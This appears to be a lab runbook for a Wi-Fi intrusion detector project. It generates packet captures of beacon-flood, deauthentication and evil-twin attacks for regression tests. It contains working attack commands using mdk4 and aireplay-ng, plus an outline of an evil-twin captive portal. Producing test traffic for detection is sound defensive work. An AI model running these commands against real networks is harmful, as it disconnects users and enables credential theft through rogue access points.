# PCAP Generation Runbook

> Hardware day only. Requires Panda PAU0B in monitor mode on ch6 and the WARDEN system running.

## Prerequisites

```bash
sudo scripts/setup-monitor-mode.sh   # puts panda0 in monitor mode on ch6
```

## Beacon Flood

Terminal 1 (capture):
```bash
sudo tcpdump -i panda0 -w captures/beacon-flood.pcap
```

Terminal 2 (attack):
```bash
mdk4 panda0 b -n FakeNet -c 6
# Ctrl-C after 30 seconds
```

## Deauth Attack

Terminal 1 (capture):
```bash
sudo tcpdump -i panda0 -w captures/deauth.pcap
```

Terminal 2 (attack):
```bash
sudo aireplay-ng --deauth 1000 -a AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF panda0
# Replace AA:BB:CC:DD:EE:FF with actual lab router BSSID
```

## Evil Twin

Start hostapd clone of target, dnsmasq for DHCP/DNS, and captive portal. See docs/lab-setup.md for full configuration.

```bash
sudo tcpdump -i panda0 -w captures/evil-twin.pcap
```

## Full Chain (all 3 phases)

Run all three attacks in sequence within a 60-second window, capturing everything:

```bash
sudo tcpdump -i panda0 -w captures/chain.pcap
```

Then trigger the WARDEN chain attack via the Attacker Panel.

## Using Captures with the Detector

```bash
python3 -m detector.main --pcap captures/chain.pcap --bssid AA:BB:CC:DD:EE:FF --ssid LAB_WARDEN_UTP
```

Replace AA:BB:CC:DD:EE:FF with the lab router BSSID discovered during recon.

## Validation Gate

Before using captures for regression tests, verify they contain the expected frame types:

```bash
# Should see Beacon, Deauth frame types
tshark -r captures/chain.pcap -T fields -e frame.type -e wlan.fc.type_subtype | sort | uniq -c
```
